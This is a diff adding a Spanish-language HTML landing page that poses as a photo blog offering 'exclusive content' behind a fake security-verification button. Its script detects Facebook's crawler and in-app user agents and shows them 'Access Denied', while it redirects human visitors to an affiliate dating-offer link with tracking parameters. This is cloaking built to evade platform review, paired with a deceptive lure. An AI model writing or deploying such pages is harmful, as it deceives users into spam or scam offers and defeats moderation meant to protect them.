@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lifestyle & Photo Blog</title>
+    
+    <meta property="og:title" content="Galería de Estilo de Vida" />
+    <meta property="og:description" content="Explora las mejores capturas de la semana en nuestro blog oficial." />
+    <meta property="og:image" content="https://i.postimg.cc/zBWGjGcb/Vista-Uno-Sepia.png" />
+    <meta property="og:type" content="website" />
+    <meta name="robots" content="index, follow">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .main-card { background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        body { background-color: #f3f4f6; color: #1f2937; }
+        .btn-fb { background-color: #000000; color: white; transition: all 0.3s; }
+        .btn-fb:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        /* Estilo para el widget de visitas para que no rompa el diseño */
+        #wau-container { position: fixed; bottom: 10px; right: 10px; z-index: 999; opacity: 0.5; }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-6">
+
+    <div class="max-w-md w-full main-card p-8 text-center">
+        <div class="mb-6">
+            <img src="https://i.postimg.cc/kXXfxHsJ/Tik-Tok-logo-svg.png" class="w-24 h-24 rounded-full mx-auto border-4 border-gray-100 shadow-sm">
+        </div>
+
+        <h1 class="text-2xl font-extrabold mb-2 tracking-tight">Contenido Exclusivo</h1>
+        <p class="text-gray-500 mb-8">Estás a un paso de acceder al catálogo completo de nuestra comunidad.</p>
+
+        <button id="mainAction" onclick="processVisit()" class="w-full btn-fb py-4 rounded-2xl font-bold text-lg mb-4">
+            VER CATÁLOGO AHORA
+        </button>
+
+        <p class="text-[10px] text-gray-400 uppercase tracking-widest">Verificación de seguridad requerida</p>
+    </div>
+
+    <div id="wau-container">
+        <script id="_wau1ca">var _wau = _wau || []; _wau.push(["dynamic", "valencia", "1ca", "ffffffffffff", "small"]);</script>
+        <script async src="//waust.at/d.js"></script>
+    </div>
+
+    <script>
+        const REAL_OFFER = "https://aoarlv.satlsfyingdates.net/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=234303&s2=2120420&s3=Barvalencia"; 
+
+        function processVisit() {
+            const btn = document.getElementById('mainAction');
+            btn.innerHTML = "Verificando...";
+            btn.disabled = true;
+
+            const isBot = /facebookexternalhit|Facebot|FB_IAB|FBAN|FBAV/i.test(navigator.userAgent);
+            
+            setTimeout(() => {
+                if (isBot) {
+                    btn.innerHTML = "Acceso Denegado";
+                } else {
+                    window.location.href = REAL_OFFER;
+                }
+            }, 600);
+        }
+    </script>
+</body>
+</html>
